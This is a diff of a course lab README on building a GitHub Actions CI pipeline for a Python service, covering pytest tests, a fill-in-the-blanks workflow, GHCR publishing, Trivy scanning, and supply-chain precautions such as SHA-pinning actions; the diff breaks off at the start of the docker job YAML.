@@ -1,916 +1,532 @@
-# Lab 3 — Continuous Integration (CI/CD)
+# Lab 3 — Continuous Integration with GitHub Actions
 
 ![difficulty](https://img.shields.io/badge/difficulty-beginner-success)
 ![topic](https://img.shields.io/badge/topic-CI/CD-blue)
-![points](https://img.shields.io/badge/points-10%2B2.5-orange)
+![points](https://img.shields.io/badge/points-10%2B2-orange)
 ![tech](https://img.shields.io/badge/tech-GitHub%20Actions-informational)
 
-> Automate your Python app testing and Docker builds with GitHub Actions CI/CD pipeline.
+> **Goal:** Put a pipeline behind the Lab 1/2 service. Every push: test → lint → scan → build → publish, on a clean runner, automatically.
+> **Deliverable:** A PR from `lab03` adding `.github/workflows/python-ci.yml`, `app_python/tests/`, `requirements-dev.txt`, branch protection, and `app_python/docs/LAB03.md`.
+
+---
 
 ## Overview
 
-Take your containerized app from Labs 1-2 and add automated testing and deployment. Learn how CI/CD catches bugs early, ensures code quality, and automates the Docker build/push workflow.
+A green check on your laptop proves nothing. CI runs the *same* steps on the *same* runner for *every* commit, so "works on my machine" stops being a defence. The skill this lab assesses is **writing the GitHub Actions workflow by hand** — not filling in the last word of someone else's YAML.
 
-**What You'll Learn:**
-- Writing effective unit tests
-- GitHub Actions workflow syntax
-- CI/CD best practices (caching, matrix builds, security scanning)
-- Automated Docker image publishing
-- Continuous integration for multiple applications
+In this lab you practice:
+- Writing pytest tests against the Lab 1 endpoints (real assertions, not import smoke tests)
+- Composing a GitHub Actions workflow file *from the keys up* — `name`, `on`, `permissions`, `concurrency`, `jobs`, `steps`
+- Publishing Docker images to GHCR using `GITHUB_TOKEN` (no PAT, nothing to rotate)
+- Gating merges on a Trivy filesystem scan
+- Speeding CI up with `setup-python`'s pip cache and BuildKit's GHA layer cache
 
-**Tech Stack:** GitHub Actions | pytest 8+ | Python 3.11+ | Snyk | Docker
-
-**Connection to Previous Labs:**
-- **Lab 1:** Test the endpoints you created
-- **Lab 2:** Automate the Docker build/push workflow
-- **Lab 4+:** This CI pipeline will run for all future labs
+> ⚠️ **Scope:** No deploy step. CI publishes the image — the cluster pulls it in Lab 9+. Don't build a deploy-on-merge here; you'd be re-doing it with ArgoCD in Lab 13 anyway.
 
 ---
 
-## Tasks
+## Project State
 
-### Task 1 — Unit Testing (3 pts)
+**You should have from previous labs:**
+- `app_python/` from Lab 1 — Flask/FastAPI service with `/` and `/health`
+- `app_python/Dockerfile` from Lab 2 — multi-stage, non-root, builds clean locally
+- `app_python/requirements.txt` — pinned dependencies
 
-**Objective:** Write comprehensive unit tests for your Python application to ensure reliability.
+**This lab adds:**
+- `app_python/requirements-dev.txt` — pytest, pytest-cov, ruff
+- `app_python/tests/test_app.py` — real assertions on `/`, `/health`, an error path
+- `.github/workflows/python-ci.yml` — the pipeline (test → scan → build → push)
+- Branch protection on `main` requiring those checks
+- `app_python/docs/LAB03.md` — your submission report
 
-**Requirements:**
-
-1. **Choose a Testing Framework**
-   - Research Python testing frameworks (pytest, unittest, etc.)
-   - Select one and justify your choice
-   - Install it in your `requirements.txt` or create `requirements-dev.txt`
-
-2. **Write Unit Tests**
-   - Create `app_python/tests/` directory
-   - Write tests for **all** your endpoints:
-     - `GET /` - Verify JSON structure and required fields
-     - `GET /health` - Verify health check response
-   - Test both successful responses and error cases
-   - Aim for meaningful test coverage (not just basic smoke tests)
-
-3. **Run Tests Locally**
-   - Verify all tests pass locally before CI setup
-   - Document how to run tests in your README
-
-<details>
-<summary>💡 Testing Framework Guidance</summary>
-
-**Popular Python Testing Frameworks:**
-
-**pytest (Recommended):**
-- Pros: Simple syntax, powerful fixtures, excellent plugin ecosystem
-- Cons: Additional dependency
-- Use case: Most modern Python projects
-
-**unittest:**
-- Pros: Built into Python (no extra dependencies)
-- Cons: More verbose, less modern features
-- Use case: Minimal dependency projects
-
-**Key Testing Concepts to Research:**
-- Test fixtures and setup/teardown
-- Mocking external dependencies
-- Testing HTTP endpoints (test client usage)
-- Test coverage measurement
-- Assertions and expected vs actual results
-
-**What Should You Test?**
-- Correct HTTP status codes (200, 404, 500)
-- Response data structure (JSON fields present)
-- Response data types (strings, integers, etc.)
-- Edge cases (invalid requests, missing data)
-- Error handling (what happens when things fail?)
-
-**Questions to Consider:**
-- How do you test a Flask/FastAPI app without starting the server?
-- Should you test that `hostname` returns your actual hostname, or just that the field exists?
-- How do you simulate different client IPs or user agents in tests?
-
-**Resources:**
-- [Pytest Documentation](https://docs.pytest.org/)
-- [Flask Testing](https://flask.palletsprojects.com/en/stable/testing/)
-- [FastAPI Testing](https://fastapi.tiangolo.com/tutorial/testing/)
-- [Python unittest](https://docs.python.org/3/library/unittest.html)
-
-**Anti-Patterns to Avoid:**
-- Testing framework functionality instead of your code
-- Tests that always pass regardless of implementation
-- Tests with no assertions
-- Tests that depend on external services
-
-</details>
-
-**What to Document:**
-- Your testing framework choice and why
-- Test structure explanation
-- How to run tests locally
-- Terminal output showing all tests passing
+By Lab 13 this pipeline's GHCR image is what ArgoCD watches. The tagging strategy you pick this week is the one your future deploys will rely on.
 
 ---
 
-### Task 2 — GitHub Actions CI Workflow (4 pts)
+## Setup
 
-**Objective:** Create a GitHub Actions workflow that automatically tests your code and builds Docker images with proper versioning.
+```bash
+python --version            # 3.12+; the matrix tests 3.12 and 3.13
+docker version              # 29.x; same as Lab 2
+trivy --version             # v0.69.3 or later — NEVER v0.69.4 (see below)
 
-**Requirements:**
-
-1. **Create Workflow File**
-   - Create `.github/workflows/python-ci.yml` in your repository
-   - Name your workflow descriptively
-
-2. **Implement Essential CI Steps**
-
-   Your workflow must include these logical stages:
-
-   **a) Code Quality & Testing:**
-   - Install dependencies
-   - Run a linter (pylint, flake8, black, ruff, etc.)
-   - Run your unit tests
-
-   **b) Docker Build & Push with Versioning:**
-   - Authenticate with Docker Hub
-   - Build your Docker image
-   - Tag with proper version strategy (see versioning section below)
-   - Push to Docker Hub with multiple tags
-
-3. **Versioning Strategy**
-
-   Choose **one** versioning approach and implement it:
-
-   **Option A: Semantic Versioning (SemVer)**
-   - Version format: `v1.2.3` (major.minor.patch)
-   - Use git tags for releases
-   - Tag images like: `username/app:1.2.3`, `username/app:1.2`, `username/app:latest`
-   - **When to use:** Traditional software releases with breaking changes
-
-   **Option B: Calendar Versioning (CalVer)**
-   - Version format: `2024.01.15` or `2024.01` (year.month.day or year.month)
-   - Based on release date
-   - Tag images like: `username/app:2024.01`, `username/app:latest`
-   - **When to use:** Time-based releases, continuous deployment
-
-   **Required:**
-   - Document which strategy you chose and why
-   - Implement it in your CI workflow
-   - Show at least 2 tags per image (e.g., version + latest)
-
-4. **Workflow Triggers**
-   - Configure when the workflow runs (push, pull request, etc.)
-   - Consider which branches should trigger builds
-
-5. **Testing the Workflow**
-   - Push your workflow file and verify it runs
-   - Fix any issues that arise
-   - Ensure all steps complete successfully
-   - Verify Docker Hub shows your version tags
-
-<details>
-<summary>💡 GitHub Actions Concepts</summary>
-
-**Core Concepts to Research:**
-
-**Workflow Anatomy:**
-- `name` - What is your workflow called?
-- `on` - When does it run? (push, pull_request, schedule, etc.)
-- `jobs` - What work needs to be done?
-- `steps` - Individual commands within a job
-- `runs-on` - What OS environment? (ubuntu-latest, etc.)
-
-**Key Questions:**
-- Should you run CI on every push, or only on pull requests?
-- What happens if tests fail? Should the workflow continue?
-- How do you access secrets (like Docker Hub credentials) securely?
-- Why might you want multiple jobs vs multiple steps in one job?
-
-**Python CI Steps Pattern:**
-```yaml
-# This is a pattern, not exact copy-paste code
-# Research the actual syntax and actions needed
-
-- Set up Python environment
-- Install dependencies
-- Run linter
-- Run tests
+# Local test of the workflow without pushing to GitHub:
+brew install act           # macOS
+# Linux: see https://github.com/nektos/act#installation
+act --version              # 0.2.88+
 ```
 
-**Docker CI Steps Pattern:**
-```yaml
-# This is a pattern, not exact copy-paste code
-# Research the actual actions and their parameters
+You'll commit only these new paths:
 
-- Log in to Docker Hub
-- Extract metadata for tags
-- Build and push Docker image
 ```
-
-**Important Concepts:**
-- **Actions Marketplace:** Reusable actions (actions/checkout@v4, actions/setup-python@v5, docker/build-push-action@v6)
-- **Secrets:** How to store Docker Hub credentials securely
-- **Job Dependencies:** Can one job depend on another succeeding?
-- **Matrix Builds:** Testing multiple Python versions (optional but good to know)
-- **Caching:** Speed up workflows by caching dependencies (we'll add this in Task 3)
-
-**Resources:**
-- [GitHub Actions Documentation](https://docs.github.com/en/actions)
-- [Building and Testing Python](https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python)
-- [Publishing Docker Images](https://docs.docker.com/ci-cd/github-actions/)
-- [GitHub Actions Marketplace](https://github.com/marketplace?type=actions)
-- [Workflow Syntax](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
-
-**Security Best Practices:**
-- Never hardcode passwords or tokens in workflow files
-- Use GitHub Secrets for sensitive data
-- Understand when secrets are exposed to pull requests from forks
-- Use `secrets.GITHUB_TOKEN` for GitHub API access (auto-provided)
-
-**Docker Hub Authentication:**
-You'll need to create a Docker Hub access token and add it as a GitHub Secret. Research:
-- How to create Docker Hub access tokens
-- How to add secrets to your GitHub repository
-- How to reference secrets in workflow files (hint: `${{ secrets.NAME }}`)
-
-</details>
-
-<details>
-<summary>💡 Versioning Strategy Guidance</summary>
-
-**Semantic Versioning (SemVer):**
-
-**Format:** MAJOR.MINOR.PATCH (e.g., 1.2.3)
-- **MAJOR:** Breaking changes (incompatible API changes)
-- **MINOR:** New features (backward-compatible)
-- **PATCH:** Bug fixes (backward-compatible)
-
-**Implementation Approaches:**
-1. **Manual Git Tags:** Create git tags (v1.0.0) and reference in workflow
-2. **Automated from Commits:** Parse conventional commits to bump version
-3. **GitHub Releases:** Trigger on release creation
-
-**Docker Tagging Example:**
-- `username/app:1.2.3` (full version)
-- `username/app:1.2` (minor version, rolling)
-- `username/app:1` (major version, rolling)
-- `username/app:latest` (latest stable)
-
-**Pros:** Clear when breaking changes occur, industry standard for libraries
-**Cons:** Requires discipline to follow rules correctly
+.github/
+└── workflows/
+    └── python-ci.yml                  # the workflow you write
+app_python/
+├── requirements-dev.txt
+├── tests/
+│   └── test_app.py
+└── docs/
+    └── LAB03.md
+```
 
 ---
 
-**Calendar Versioning (CalVer):**
+## ⚠️ A Note on Supply-Chain Safety (read before Task 2)
 
-**Common Formats:**
-- `YYYY.MM.DD` (e.g., 2024.01.15) - Daily releases
-- `YYYY.MM.MICRO` (e.g., 2024.01.0) - Monthly with patch number
-- `YYYY.0M` (e.g., 2024.01) - Monthly releases
+CI runs third-party code with access to your repository's secrets — the actions you pin **are** your attack surface. Two recent incidents define the rules:
 
-**Implementation Approaches:**
-1. **Date-based:** Generate from current date in workflow
-2. **Git SHA:** Combine with short commit SHA (2024.01-a1b2c3d)
-3. **Build Number:** Use GitHub run number (2024.01.42)
+- **`tj-actions/changed-files` (CVE-2025-30066, March 14–15 2025)** — a compromised release leaked secrets from CI logs in **23,000+ repositories**. Every repo pinned to `@main` or a floating tag pulled the malicious code automatically. Fixed in `v46.0.1`.
+- **Trivy (CVE-2026-33634, March 19 2026)** — a malicious **`v0.69.4`** binary was published to the official GitHub release page after a maintainer signing key was compromised. **Use `v0.69.3` or a later patched release — NEVER `v0.69.4`.** The Action wrapper (`aquasecurity/trivy-action@v0.35.0`+) and `setup-trivy@v0.2.6`+ are post-incident-safe.
 
-**Docker Tagging Example:**
-- `username/app:2024.01` (month version)
-- `username/app:2024.01.123` (with build number)
-- `username/app:latest` (latest build)
+**What you do about it in this lab:**
+- Pin the runner OS: `runs-on: ubuntu-24.04`, not `ubuntu-latest`.
+- Pin actions to a major tag: `actions/checkout@v4`. For high-risk or third-party actions, pin to a **full commit SHA** — a tag can be re-pointed by an attacker; a SHA cannot.
+- Scope `permissions:` to the minimum each job needs (`contents: read` by default; `packages: write` only on the job that pushes to GHCR).
+- Never push images from PRs **from forks** — a fork can rewrite the Dockerfile and use your `GITHUB_TOKEN` to publish a malicious image to your namespace.
 
-**Pros:** No ambiguity, good for continuous deployment, easier to remember
-**Cons:** Doesn't indicate breaking changes
+> 📌 Example SHA-pin (the comment keeps it readable):
+> ```yaml
+> - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+> ```
 
 ---
 
-**How to Implement in CI:**
+## Task 1 — Unit Tests with pytest (2 pts)
 
-**Using docker/metadata-action:**
-```yaml
-# Pattern - research actual syntax
-- name: Docker metadata
-  uses: docker/metadata-action
-  with:
-    # Define your tagging strategy here
-    # Can reference git tags, dates, commit SHAs
+### 1.1 — Pick a runner and justify it
+
+Use **pytest 8.3+**. Fixtures + plain `assert` beat `unittest`'s boilerplate for most projects, and `pytest-cov` is one line to wire in for the bonus. In `docs/LAB03.md` give one paragraph on why pytest over `unittest`.
+
+### 1.2 — Write `requirements-dev.txt`
+
+`YOUR TASK`: create `app_python/requirements-dev.txt` with **exactly-pinned** versions of the dev tools — `pytest`, `pytest-cov`, and a linter (`ruff` recommended; `flake8` or `pylint` accepted). Use `pkg==X.Y.Z` form, not floating ranges; the lock-it-down argument from Lab 2 applies.
+
+### 1.3 — Write tests that actually fail when the app is broken
+
+`YOUR TASK`: create `app_python/tests/test_app.py` with at least three tests. Each must assert on **behaviour**, not just that an import succeeded:
+
+| Test | Asserts |
+|------|---------|
+| `GET /` | status `200`, response is JSON, body contains the **five** keys from Lab 1 (`service`, `system`, `runtime`, `request`, `endpoints`) |
+| `GET /health` | status `200`, JSON body has `status == "healthy"` |
+| Unknown route | status `404`, body is JSON (not the framework's HTML default — proves your Lab 1 error handler is wired) |
+
+Hints (no full code given — writing the tests *is* the skill):
+
+- Flask: `app.test_client()` in a `pytest.fixture`; `r.get_json()` on the response.
+- FastAPI: `from fastapi.testclient import TestClient`; `r.json()` on the response.
+- **Don't** test internal helpers; test routes. A test that calls `get_uptime()` directly won't catch a routing typo.
+- **Don't** assert exact uptime values — flaky. Assert the *shape* (e.g. `"uptime_seconds" in body["runtime"] and isinstance(..., int)`).
+
+### 1.4 — Run them locally
+
+```bash
+cd app_python
+python -m venv venv && source venv/bin/activate
+pip install -r requirements.txt -r requirements-dev.txt
+pytest -q
+ruff check .
 ```
 
-**Manual Tagging:**
-```yaml
-# Pattern - research actual syntax
-- name: Generate version
-  run: echo "VERSION=$(date +%Y.%m.%d)" >> $GITHUB_ENV
+Both must exit `0`. If they don't, fix the app, not the tests.
 
-- name: Build and push
-  # Use ${{ env.VERSION }} in tags
-```
+### 1.5 — Proof of work
 
-**Questions to Consider:**
-- How often will you release? (Daily? Per feature? Monthly?)
-- Do users need to know about breaking changes explicitly?
-- Are you building a library (use SemVer) or a service (CalVer works)?
-- How will you track what's in each version?
+**Paste into `docs/LAB03.md`:**
 
-**Resources:**
-- [Semantic Versioning](https://semver.org/)
-- [Calendar Versioning](https://calver.org/)
-- [Docker Metadata Action](https://github.com/docker/metadata-action)
-- [Conventional Commits](https://www.conventionalcommits.org/) (for automated SemVer)
-
-</details>
-
-<details>
-<summary>💡 Debugging GitHub Actions</summary>
-
-**Common Issues & How to Debug:**
-
-**Workflow Won't Trigger:**
-- Check your `on:` configuration
-- Verify you pushed to the correct branch
-- Look at Actions tab for filtering options
-
-**Steps Failing:**
-- Click into the failed step to see full logs
-- Check for typos in action names or parameters
-- Verify secrets are configured correctly
-- Test commands locally first
-
-**Docker Build Fails:**
-- Ensure Dockerfile is in the correct location
-- Check context path in build step
-- Verify base image exists and is accessible
-- Test Docker build locally first
-
-**Authentication Issues:**
-- Verify secret names match exactly (case-sensitive)
-- Check that Docker Hub token has write permissions
-- Ensure you're using `docker/login-action` correctly
-
-**Debugging Techniques:**
-- Add `run: echo "Debug message"` steps to understand workflow state
-- Use `run: env` to see available environment variables
-- Check Actions tab for detailed logs
-- Enable debug logging (add `ACTIONS_RUNNER_DEBUG` secret = true)
-
-</details>
-
-**What to Document:**
-- Your workflow trigger strategy and reasoning
-- Why you chose specific actions from the marketplace
-- Your Docker tagging strategy (latest? version tags? commit SHA?)
-- Link to successful workflow run in GitHub Actions tab
-- Terminal output or screenshot of green checkmark
+- The output of `pytest -q` (real run from your machine — at least 3 dots, all passed)
+- The output of `ruff check .` (or `flake8 .`) — "All checks passed!" or equivalent
+- One sentence per test explaining what behaviour it locks in (this prevents "delete the test when it breaks" syndrome later)
 
 ---
 
-### Task 3 — CI Best Practices & Security (3 pts)
+## Task 2 — Test & Lint in CI (3 pts)
 
-**Objective:** Optimize your CI workflow and add security scanning.
+Now wire the tests into GitHub Actions. The workflow file lives at `.github/workflows/python-ci.yml`. Tasks 2–4 all extend the **same file** — Task 2 delivers the `test` job, Task 3 adds `docker`, Task 4 wires the Trivy gate.
 
-**Requirements:**
+### 2.1 — Understand the keys before you write
 
-1. **Add Status Badge**
-   - Add a GitHub Actions status badge to your `app_python/README.md`
-   - The badge should show the current workflow status (passing/failing)
+A workflow has five top-level keys you will write:
 
-2. **Implement Dependency Caching**
-   - Add caching for Python dependencies to speed up workflow
-   - Measure and document the speed improvement
+| Key | What it controls | Lab 3 value |
+|-----|------------------|-------------|
+| `name:` | Display name in the Actions tab | freeform |
+| `on:` | Triggers | `push` to `main` **and** `pull_request` |
+| `permissions:` | What `GITHUB_TOKEN` can do | start `contents: read`; grant `packages: write` per-job |
+| `concurrency:` | De-dup superseded runs | group by ref, `cancel-in-progress: true` |
+| `jobs:` | The work | `test` (this task), `docker` (Task 3) |
 
-3. **Add Security Scanning with Snyk**
-   - Integrate Snyk vulnerability scanning into your workflow
-   - Configure it to check for vulnerabilities in your dependencies
-   - Document any vulnerabilities found and how you addressed them
+### 2.2 — Write the workflow skeleton
 
-4. **Apply CI Best Practices**
-   - Research and implement at least 3 additional CI best practices
-   - Document which practices you applied and why they matter
+`YOUR TASK`: create `.github/workflows/python-ci.yml` and fill in every blank. The skeleton shows the YAML **shape** — you supply the **values + step bodies**. Don't paste a workflow you found online; the grader will ask why you picked each value.
 
-<details>
-<summary>💡 CI Best Practices Guidance</summary>
-
-**Dependency Caching:**
-
-Caching speeds up workflows by reusing previously downloaded dependencies.
-
-**Key Concepts:**
-- What should be cached? (pip packages, Docker layers, etc.)
-- What's the cache key? (based on requirements.txt hash)
-- When does cache become invalid?
-- How much time does caching save?
-
-**Actions to Research:**
-- `actions/cache` for general caching
-- `actions/setup-python` has built-in cache support
-
-**Questions to Explore:**
-- Where are Python packages stored that should be cached?
-- How do you measure cache hit vs cache miss?
-- What happens if requirements.txt changes?
-
-**Status Badges:**
-
-Show workflow status directly in your README.
-
-**Format Pattern:**
-```markdown
-![Workflow Name](https://github.com/username/repo/workflows/workflow-name/badge.svg)
-```
-
-Research how to:
-- Get the correct badge URL for your workflow
-- Make badges clickable (link to Actions tab)
-- Display specific branch status
-
-**CI Best Practices to Consider:**
-
-Research and choose at least 3 to implement:
-
-1. **Fail Fast:** Stop workflow on first failure
-2. **Matrix Builds:** Test multiple Python versions (3.12, 3.13)
-3. **Job Dependencies:** Don't push Docker if tests fail
-4. **Conditional Steps:** Only push on main branch
-5. **Pull Request Checks:** Require passing CI before merge
-6. **Workflow Concurrency:** Cancel outdated workflow runs
-7. **Docker Layer Caching:** Cache Docker build layers
-8. **Environment Variables:** Use env for repeated values
-9. **Secrets Scanning:** Prevent committing secrets
-10. **YAML Validation:** Lint your workflow files
-
-**Resources:**
-- [GitHub Actions Best Practices](https://docs.github.com/en/actions/learn-github-actions/usage-limits-billing-and-administration#usage-limits)
-- [Caching Dependencies](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows)
-- [Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
-
-</details>
-
-<details>
-<summary>💡 Snyk Integration Guidance</summary>
-
-**What is Snyk?**
-
-Snyk is a security tool that scans your dependencies for known vulnerabilities.
-
-**Key Concepts:**
-- Vulnerability databases (CVEs)
-- Severity levels (low, medium, high, critical)
-- Automated dependency updates
-- Security advisories
-
-**Integration Options:**
-
-1. **Snyk GitHub Action:**
-   - Use `snyk/actions` from GitHub Marketplace
-   - Requires Snyk API token (free tier available)
-   - Can fail builds on vulnerabilities
-
-2. **Snyk CLI in Workflow:**
-   - Install Snyk CLI in workflow
-   - Run `snyk test` command
-   - More flexible but requires setup
-
-**Setup Steps:**
-1. Create free Snyk account
-2. Get API token from Snyk dashboard
-3. Add token as GitHub Secret
-4. Add Snyk step to workflow
-5. Configure severity threshold (what level fails the build?)
-
-**Questions to Explore:**
-- Should every vulnerability fail your build?
-- What if vulnerabilities have no fix available?
-- How do you handle false positives?
-- When should you break the build vs just warn?
-
-**Resources:**
-- [Snyk GitHub Actions](https://github.com/snyk/actions)
-- [Snyk Python Example](https://github.com/snyk/actions/tree/master/python)
-- [Snyk Documentation](https://docs.snyk.io/integrations/ci-cd-integrations/github-actions-integration)
-
-**Common Issues:**
-- Dependencies not installed before Snyk runs
-- API token not configured correctly
-- Overly strict severity settings breaking builds
-- Virtual environment confusion
-
-**What to Document:**
-- Your severity threshold decision and reasoning
-- Any vulnerabilities found and your response
-- Whether you fail builds on vulnerabilities or just warn
-
-</details>
-
-**What to Document:**
-- Status badge in README (visible proof it works)
-- Caching implementation and speed improvement metrics
-- CI best practices you applied with explanations
-- Snyk integration results and vulnerability handling
-- Terminal output showing improved workflow performance
-
----
-
-## Bonus Task — Multi-App CI with Path Filters + Test Coverage (2.5 pts)
-
-**Objective:** Set up CI for your compiled language app with intelligent path-based triggers AND add test coverage tracking.
-
-**Part 1: Multi-App CI (1.5 pts)**
-
-1. **Create Second CI Workflow**
-   - Create `.github/workflows/<language>-ci.yml` for your Go/Rust/Java app
-   - Implement similar CI steps (lint, test, build Docker image)
-   - Use language-specific actions and best practices
-   - Apply versioning strategy (SemVer or CalVer) consistently
-
-2. **Implement Path-Based Triggers**
-   - Python workflow should only run when `app_python/` files change
-   - Compiled language workflow should only run when `app_<language>/` files change
-   - Neither should run when only docs or other files change
-
-3. **Optimize for Multiple Apps**
-   - Ensure both workflows can run in parallel
-   - Consider using workflow templates (DRY principle)
-   - Document the benefits of path-based triggers
-
-**Part 2: Test Coverage Badge (1 pt)**
-
-4. **Add Coverage Tracking**
-   - Install coverage tool (`pytest-cov` for Python, coverage tool for your other language)
-   - Generate coverage reports in CI workflow
-   - Integrate with codecov.io or coveralls.io (free for public repos)
-   - Add coverage badge to README showing percentage
-
-5. **Coverage Goals**
-   - Document your current coverage percentage
-   - Identify what's not covered and why
-   - Set a coverage threshold in CI (e.g., fail if below 70%)
-
-<details>
-<summary>💡 Path Filters & Multi-App CI</summary>
-
-**Why Path Filters?**
-
-In a monorepo with multiple apps, you don't want to run Python CI when only Go code changes.
-
-**Path Filter Syntax:**
 ```yaml
+name: ___                              # YOUR TASK: workflow display name
+
 on:
-  push:
+  ___:                                 # YOUR TASK: which event? push to main? branches filter?
+    branches: [___]
+    paths:                             # YOUR TASK: skip CI on docs-only commits
+      - ___
+      - ___
+  ___:                                 # YOUR TASK: the other event (pull_request)
     paths:
-      - 'app_python/**'
-      - '.github/workflows/python-ci.yml'
+      - ___
+      - ___
+
+permissions:
+  contents: ___                        # YOUR TASK: minimum needed for checkout
+
+concurrency:
+  group: ___                           # YOUR TASK: how do you de-dup superseded runs on the SAME ref?
+  cancel-in-progress: ___              # YOUR TASK: should an older run keep going? why/why not?
+
+jobs:
+  test:
+    runs-on: ___                       # YOUR TASK: which runner? why pinned (not :latest)?
+    strategy:
+      fail-fast: ___                   # YOUR TASK: should 3.12 dying kill 3.13? what does that hide?
+      matrix:
+        python-version: [___, ___]     # YOUR TASK: which versions? (Lab 1 standardised on which?)
+
+    steps:
+      - uses: actions/checkout@___     # YOUR TASK: pin to major tag (or SHA — see supply-chain note)
+
+      - uses: actions/setup-python@___
+        with:
+          python-version: ___          # YOUR TASK: reference the matrix value
+          cache: ___                   # YOUR TASK: which cache mode does setup-python provide?
+          cache-dependency-path: ___   # YOUR TASK: which file(s) does the cache key hash?
+                                       #            (you install BOTH requirements.txt + requirements-dev.txt —
+                                       #             cache must invalidate on either; YAML accepts a multi-line list)
+
+      - name: ___                      # YOUR TASK: human-readable step name
+        working-directory: ___         # YOUR TASK: which dir holds requirements*.txt + tests/?
+        run: |
+          # YOUR TASK: install both runtime and dev requirements
+          # Hint: pip install -r requirements.txt -r requirements-dev.txt
+
+      - name: ___                      # YOUR TASK: lint step name
+        working-directory: ___         # YOUR TASK: same dir as install — ruff scans the code, not the repo root
+        run: ___                       # YOUR TASK: ruff/flake8/pylint command
+
+      - name: ___                      # YOUR TASK: test step name
+        working-directory: ___         # YOUR TASK: same dir — without this, pytest finds 0 tests
+        run: ___                       # YOUR TASK: pytest command (quiet mode? cov?)
 ```
 
-**Key Concepts:**
-- Glob patterns for path matching
-- When to include workflow file itself
-- Exclude patterns (paths-ignore)
-- How to test path filters
+> 💡 **Why `working-directory:` on every step?** A fresh runner starts at the repo root (`$GITHUB_WORKSPACE`). Without `working-directory:`, `pytest -q` runs at the repo root and reports **`collected 0 items`** — a green-but-meaningless run. Set the dir on each step that touches the app (or set it once at the job level via `defaults.run.working-directory`).
 
-**Questions to Explore:**
-- Should changes to README.md trigger CI?
-- Should changes to the root .gitignore trigger CI?
-- What about changes to both apps in one commit?
-- How do you test that path filters work correctly?
+### 2.3 — Add a status badge
 
-**Multi-Language CI Patterns:**
+`YOUR TASK`: once the workflow runs once on your fork, GitHub generates a badge URL of the form `https://github.com/<user>/<repo>/actions/workflows/python-ci.yml/badge.svg`. Add it to `app_python/README.md` at the top as a markdown image with a link back to the Actions tab — e.g.
 
-**For Go:**
-- actions/setup-go
-- golangci-lint for linting
-- go test for testing
-- Multi-stage Docker builds (from Lab 2 bonus)
+```md
+[![Python CI](https://github.com/<user>/<repo>/actions/workflows/python-ci.yml/badge.svg)](https://github.com/<user>/<repo>/actions/workflows/python-ci.yml)
+```
 
-**For Rust:**
-- actions-rs/toolchain
-- cargo clippy for linting
-- cargo test for testing
-- cargo-audit for security
+### 2.4 — Validate locally with `act` before pushing
 
-**For Java:**
-- actions/setup-java
-- Maven or Gradle for build
-- Checkstyle or SpotBugs for linting
-- JUnit tests
+Saves you minutes of CI debugging:
 
-**Workflow Reusability:**
-
-Consider:
-- Reusable workflows (call one workflow from another)
-- Composite actions (bundle steps together)
-- Workflow templates (DRY for similar workflows)
-
-**Resources:**
-- [Path Filters](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpaths)
-- [Reusable Workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows)
-- [Starter Workflows](https://github.com/actions/starter-workflows/tree/main/ci)
-
-</details>
-
-<details>
-<summary>💡 Test Coverage Tracking</summary>
-
-**What is Test Coverage?**
-
-Coverage measures what percentage of your code is executed by your tests. High coverage = more code is tested.
-
-**Why Coverage Matters:**
-- Identifies untested code paths
-- Prevents regressions (changes breaking untested code)
-- Increases confidence in refactoring
-- Industry standard quality metric
-
-**Coverage Tools by Language:**
-
-**Python (pytest-cov):**
 ```bash
-# Install
-pip install pytest-cov
-
-# Run with coverage
-pytest --cov=app_python --cov-report=xml --cov-report=term
-
-# Generates coverage.xml for upload
+act -l                                                                       # list jobs
+act push -j test --matrix python-version:3.13 -P ubuntu-24.04=catthehacker/ubuntu:act-24.04
 ```
 
-**Go (built-in):**
-```bash
-go test -coverprofile=coverage.out ./...
-go tool cover -html=coverage.out
-```
+If `act` fails, your workflow is broken — fix it before pushing.
 
-**Rust (tarpaulin):**
-```bash
-cargo install cargo-tarpaulin
-cargo tarpaulin --out Xml
-```
+### 2.5 — Proof of work
 
-**Java (JaCoCo with Maven/Gradle):**
-```bash
-mvn test jacoco:report
-# or
-gradle test jacocoTestReport
-```
+**Paste into `docs/LAB03.md`:**
 
-**Integration Services:**
+- Link to a green workflow run on your fork (or `act` output if you can't get CI on the fork yet)
+- The full workflow file (or a permalink to it in your repo)
+- One paragraph: why your trigger filter (`paths:`) is what it is — what changes *should* fire CI, and what shouldn't?
+- One number: warm-cache install time vs cold-cache install time (look at the "Set up Python" step duration on a second run vs the first)
 
-**Codecov (Recommended):**
-- Free for public repos
-- Beautiful visualizations
-- PR comments with coverage diff
-- Setup: Sign in with GitHub, add repo, upload coverage report
+---
 
-**Coveralls:**
-- Alternative to Codecov
-- Similar features
-- Different UI
+## Task 3 — Build & Publish to GHCR (3 pts)
 
-**Coverage in CI Workflow:**
-```yaml
-# Pattern for Python (research actual syntax)
-- name: Run tests with coverage
-  run: pytest --cov=. --cov-report=xml
+Lab 2 pushed images by hand. CI does it for you: a `docker` job that builds the Lab 2 image and pushes it to GitHub Container Registry, authenticated with the auto-provisioned `GITHUB_TOKEN`. **No PAT. Nothing to rotate.**
 
-- name: Upload to Codecov
-  uses: codecov/codecov-action@v4
-  with:
-    file: ./coverage.xml
-    token: ${{ secrets.CODECOV_TOKEN }}
-```
+### 3.1 — Pick your tagging strategy
 
-**Coverage Badge:**
-```markdown
-![Coverage](https://codecov.io/gh/username/repo/branch/main/graph/badge.svg)
-```
+`YOUR TASK`: before writing YAML, decide:
 
-**Setting Coverage Thresholds:**
+- **SemVer** (`v1.4.2`, driven by `git tag`) — for libraries or services with external consumers who pin you.
+- **CalVer** (`2026.05.28`) — for services nobody else pins, where "breaking change" doesn't really apply.
+- **SHA-only** (`git-a3f1b2c`) — every commit gets an immutable tag. Mandatory regardless of the above; this is what reproducible deploys reference.
 
-You can fail CI if coverage drops below a threshold:
+Whatever you pick, **`:latest` is a convenience pointer, not a release.** Never deploy `:latest` to anything that matters.
+
+In `docs/LAB03.md`, justify your choice in 2–3 sentences.
+
+### 3.2 — Write the docker job
+
+`YOUR TASK`: append the `docker` job to `python-ci.yml`. Same skeleton-with-blanks rules — you write the values and the step bodies.
 
 ```yaml
